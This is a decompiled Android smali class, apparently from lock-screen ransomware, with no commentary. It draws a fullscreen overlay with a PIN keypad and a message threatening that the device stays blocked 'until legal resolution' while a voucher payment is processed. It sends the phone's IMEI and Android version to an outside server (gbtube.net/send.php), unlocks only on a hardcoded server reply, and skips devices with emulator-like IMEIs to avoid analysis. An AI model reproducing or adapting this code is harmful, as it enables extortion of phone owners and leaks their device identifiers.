.class public Lcom/lock/app/StartOvView;
.super Lcom/core/app/OverlayView;
.source "StartOvView.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/lock/app/StartOvView$HttpGetDemo;
    }
.end annotation


# instance fields
.field check:Landroid/widget/Button;

.field clear:Landroid/widget/Button;

.field eight:Landroid/widget/Button;

.field five:Landroid/widget/Button;

.field formurl:Ljava/lang/String;

.field four:Landroid/widget/Button;

.field free:Landroid/widget/Button;

.field imei:Ljava/lang/String;

.field in_pin:Landroid/widget/EditText;

.field nine:Landroid/widget/Button;

.field one:Landroid/widget/Button;

.field response:Landroid/widget/TextView;

.field send:Landroid/widget/Button;

.field sender:I

.field sender_pin:Ljava/lang/String;

.field seven:Landroid/widget/Button;

.field six:Landroid/widget/Button;

.field textID:Landroid/widget/TextView;

.field two:Landroid/widget/Button;

.field zero:Landroid/widget/Button;


# direct methods
.method public constructor <init>(Lcom/core/app/OverlayService;)V
    .locals 2
    .param p1, "service"    # Lcom/core/app/OverlayService;

    .prologue
    .line 50
    const v0, 0x7f030018

    const/4 v1, 0x1

    invoke-direct {p0, p1, v0, v1}, Lcom/core/app/OverlayView;-><init>(Lcom/core/app/OverlayService;II)V

    .line 46
    const-string v0, "THE PASS YOU ENTERED IS BEING PROCESSED.\nREPEATED ENTERING WILL NOT MAKE PROCESS FASTER.\nDO NOT TRY TO CANCEL THE VOUCHER ENTERED,\nOR YOUR DEVICE WILL BE BLOCKED UP UNTIL LEGAL RESOLUTION.\nVOUCHER PASS PROCESSING CAN TAKE AS LONG AS 24 HOURS.\n"

    iput-object v0, p0, Lcom/lock/app/StartOvView;->sender_pin:Ljava/lang/String;

    .line 53
    return-void
.end method

.method static synthetic access$0(Lcom/lock/app/StartOvView;)V
    .locals 0

    .prologue
    .line 1
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->hide()V

    return-void
.end method


# virtual methods
.method public executeHttpGet()Ljava/lang/String;
    .locals 11
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 446
    const/4 v2, 0x0

    .line 447
    .local v2, "in":Ljava/io/BufferedReader;
    const-string v5, ""

    .line 449
    .local v5, "page":Ljava/lang/String;
    :try_start_0
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 450
    .local v1, "client":Lorg/apache/http/client/HttpClient;
    new-instance v6, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v6}, Lorg/apache/http/client/methods/HttpGet;-><init>()V

    .line 451
    .local v6, "request":Lorg/apache/http/client/methods/HttpGet;
    new-instance v9, Ljava/net/URI;

    iget-object v10, p0, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    invoke-direct {v9, v10}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v9}, Lorg/apache/http/client/methods/HttpGet;->setURI(Ljava/net/URI;)V

    .line 452
    invoke-interface {v1, v6}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v7

    .line 453
    .local v7, "response":Lorg/apache/http/HttpResponse;
    new-instance v3, Ljava/io/BufferedReader;

    .line 454
    new-instance v9, Ljava/io/InputStreamReader;

    invoke-interface {v7}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 453
    invoke-direct {v3, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 455
    .end local v2    # "in":Ljava/io/BufferedReader;
    .local v3, "in":Ljava/io/BufferedReader;
    :try_start_1
    new-instance v8, Ljava/lang/StringBuffer;

    const-string v9, ""

    invoke-direct {v8, v9}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 456
    .local v8, "sb":Ljava/lang/StringBuffer;
    const-string v4, ""

    .line 457
    .local v4, "line":Ljava/lang/String;
    const-string v9, "line.separator"

    invoke-static {v9}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 458
    .local v0, "NL":Ljava/lang/String;
    :goto_0
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_1

    .line 461
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V

    .line 462
    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result-object v5

    .line 465
    if-eqz v3, :cond_0

    .line 467
    :try_start_2
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1

    .line 473
    :cond_0
    :goto_1
    return-object v5

    .line 459
    :cond_1
    :try_start_3
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    .line 464
    .end local v0    # "NL":Ljava/lang/String;
    .end local v4    # "line":Ljava/lang/String;
    .end local v8    # "sb":Ljava/lang/StringBuffer;
    :catchall_0
    move-exception v9

    move-object v2, v3

    .line 465
    .end local v1    # "client":Lorg/apache/http/client/HttpClient;
    .end local v3    # "in":Ljava/io/BufferedReader;
    .end local v6    # "request":Lorg/apache/http/client/methods/HttpGet;
    .end local v7    # "response":Lorg/apache/http/HttpResponse;
    .restart local v2    # "in":Ljava/io/BufferedReader;
    :goto_2
    if-eqz v2, :cond_2

    .line 467
    :try_start_4
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_0

    .line 472
    :cond_2
    :goto_3
    throw v9

    .line 468
    :catch_0
    move-exception v10

    goto :goto_3

    .end local v2    # "in":Ljava/io/BufferedReader;
    .restart local v0    # "NL":Ljava/lang/String;
    .restart local v1    # "client":Lorg/apache/http/client/HttpClient;
    .restart local v3    # "in":Ljava/io/BufferedReader;
    .restart local v4    # "line":Ljava/lang/String;
    .restart local v6    # "request":Lorg/apache/http/client/methods/HttpGet;
    .restart local v7    # "response":Lorg/apache/http/HttpResponse;
    .restart local v8    # "sb":Ljava/lang/StringBuffer;
    :catch_1
    move-exception v9

    goto :goto_1

    .line 464
    .end local v0    # "NL":Ljava/lang/String;
    .end local v1    # "client":Lorg/apache/http/client/HttpClient;
    .end local v3    # "in":Ljava/io/BufferedReader;
    .end local v4    # "line":Ljava/lang/String;
    .end local v6    # "request":Lorg/apache/http/client/methods/HttpGet;
    .end local v7    # "response":Lorg/apache/http/HttpResponse;
    .end local v8    # "sb":Ljava/lang/StringBuffer;
    .restart local v2    # "in":Ljava/io/BufferedReader;
    :catchall_1
    move-exception v9

    goto :goto_2
.end method

.method protected onInflateView()V
    .locals 2

    .prologue
    .line 59
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "http://gbtube.net/send.php?v="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "&brok=empty&u=3"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    .line 61
    const v0, 0x7f05003f

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->in_pin:Landroid/widget/EditText;

    .line 62
    const v0, 0x7f05003e

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->one:Landroid/widget/Button;

    .line 63
    const v0, 0x7f050040

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->two:Landroid/widget/Button;

    .line 64
    const v0, 0x7f050041

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->free:Landroid/widget/Button;

    .line 65
    const v0, 0x7f050042

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->four:Landroid/widget/Button;

    .line 66
    const v0, 0x7f050043

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->five:Landroid/widget/Button;

    .line 67
    const v0, 0x7f050044

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->six:Landroid/widget/Button;

    .line 68
    const v0, 0x7f050045

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->seven:Landroid/widget/Button;

    .line 69
    const v0, 0x7f050046

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->eight:Landroid/widget/Button;

    .line 70
    const v0, 0x7f050047

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->nine:Landroid/widget/Button;

    .line 71
    const v0, 0x7f050048

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->zero:Landroid/widget/Button;

    .line 73
    const v0, 0x7f050049

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->send:Landroid/widget/Button;

    .line 74
    const v0, 0x7f050051

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->clear:Landroid/widget/Button;

    .line 75
    const v0, 0x7f050057

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->check:Landroid/widget/Button;

    .line 76
    const v0, 0x7f050055

    invoke-virtual {p0, v0}, Lcom/lock/app/StartOvView;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    .line 80
    return-void
.end method

.method public onTouchEvent_LongPress()Z
    .locals 1

    .prologue
    .line 439
    const/4 v0, 0x0

    return v0
.end method

.method protected onTouchEvent_Move(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 428
    return-void
.end method

.method protected onTouchEvent_Press(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 433
    return-void
.end method

.method protected onTouchEvent_Up(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 423
    return-void
.end method

.method protected refreshViews()V
    .locals 10

    .prologue
    const/4 v9, -0x1

    .line 85
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->getContext()Landroid/content/Context;

    move-result-object v5

    const-string v6, "phone"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/telephony/TelephonyManager;

    .line 86
    .local v4, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v4}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/lock/app/StartOvView;->imei:Ljava/lang/String;

    .line 88
    iget-object v5, p0, Lcom/lock/app/StartOvView;->imei:Ljava/lang/String;

    const-string v6, "null"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 89
    iget-object v5, p0, Lcom/lock/app/StartOvView;->imei:Ljava/lang/String;

    const-string v6, "000000000000000"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 90
    iget-object v5, p0, Lcom/lock/app/StartOvView;->imei:Ljava/lang/String;

    const-string v6, "00000000000000"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 91
    iget-object v5, p0, Lcom/lock/app/StartOvView;->imei:Ljava/lang/String;

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 95
    :cond_0
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->destory()V

    .line 96
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->hide()V

    .line 97
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->removeAllViews()V

    .line 414
    :goto_0
    return-void

    .line 101
    :cond_1
    iget-object v5, p0, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "&id="

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcom/lock/app/StartOvView;->imei:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    .line 104
    const-string v3, ""

    .line 108
    .local v3, "response_serv":Ljava/lang/String;
    :try_start_0
    new-instance v5, Lcom/lock/app/StartOvView$HttpGetDemo;

    invoke-direct {v5, p0}, Lcom/lock/app/StartOvView$HttpGetDemo;-><init>(Lcom/lock/app/StartOvView;)V

    const/4 v6, 0x1

    new-array v6, v6, [Landroid/widget/TextView;

    const/4 v7, 0x0

    iget-object v8, p0, Lcom/lock/app/StartOvView;->textID:Landroid/widget/TextView;

    aput-object v8, v6, v7

    invoke-virtual {v5, v6}, Lcom/lock/app/StartOvView$HttpGetDemo;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 109
    iget-object v5, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    invoke-virtual {v5}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 112
    .local v2, "new_respons":Ljava/lang/String;
    const-string v5, "849384JJ881NN55"

    invoke-virtual {v2, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    if-ne v5, v9, :cond_2

    .line 114
    iget-object v5, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    invoke-virtual {v5, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 157
    .end local v2    # "new_respons":Ljava/lang/String;
    :goto_1
    iget-object v5, p0, Lcom/lock/app/StartOvView;->one:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$1;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$1;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 172
    iget-object v5, p0, Lcom/lock/app/StartOvView;->two:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$2;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$2;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 186
    iget-object v5, p0, Lcom/lock/app/StartOvView;->free:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$3;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$3;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 199
    iget-object v5, p0, Lcom/lock/app/StartOvView;->four:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$4;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$4;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 212
    iget-object v5, p0, Lcom/lock/app/StartOvView;->five:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$5;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$5;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 225
    iget-object v5, p0, Lcom/lock/app/StartOvView;->six:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$6;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$6;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 238
    iget-object v5, p0, Lcom/lock/app/StartOvView;->seven:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$7;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$7;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 251
    iget-object v5, p0, Lcom/lock/app/StartOvView;->eight:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$8;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$8;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 264
    iget-object v5, p0, Lcom/lock/app/StartOvView;->nine:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$9;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$9;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 277
    iget-object v5, p0, Lcom/lock/app/StartOvView;->zero:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$10;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$10;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 290
    iget-object v5, p0, Lcom/lock/app/StartOvView;->clear:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$11;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$11;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 305
    iget-object v5, p0, Lcom/lock/app/StartOvView;->send:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$12;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$12;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 355
    iget-object v5, p0, Lcom/lock/app/StartOvView;->check:Landroid/widget/Button;

    new-instance v6, Lcom/lock/app/StartOvView$13;

    invoke-direct {v6, p0}, Lcom/lock/app/StartOvView$13;-><init>(Lcom/lock/app/StartOvView;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    goto/16 :goto_0

    .line 118
    .restart local v2    # "new_respons":Ljava/lang/String;
    :cond_2
    :try_start_1
    iget-object v5, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    const-string v6, "PRESS HOME BUTTON"

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 119
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->destory()V

    .line 120
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->hide()V

    .line 121
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->removeAllViews()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1

    .line 125
    .end local v2    # "new_respons":Ljava/lang/String;
    :catch_0
    move-exception v0

    .line 129
    .local v0, "e":Ljava/lang/Exception;
    :try_start_2
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->executeHttpGet()Ljava/lang/String;

    move-result-object v3

    .line 133
    const-string v5, "849384JJ881NN55"

    invoke-virtual {v3, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v5

    if-ne v5, v9, :cond_3

    .line 134
    iget-object v5, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    invoke-virtual {v5, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_1

    .line 145
    :catch_1
    move-exception v1

    .line 147
    .local v1, "ev":Ljava/lang/Exception;
    iget-object v5, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    const-string v6, "SERVER IS BUSY AT THIS MOMENT.TRY AGAIN LATER.CHECK THE INTERNET CONNECTION"

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_1

    .line 137
    .end local v1    # "ev":Ljava/lang/Exception;
    :cond_3
    :try_start_3
    iget-object v5, p0, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    const-string v6, "PRESS HOME BUTTON"

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 138
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->destory()V

    .line 139
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->hide()V

    .line 140
    invoke-virtual {p0}, Lcom/lock/app/StartOvView;->removeAllViews()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto/16 :goto_1
.end method
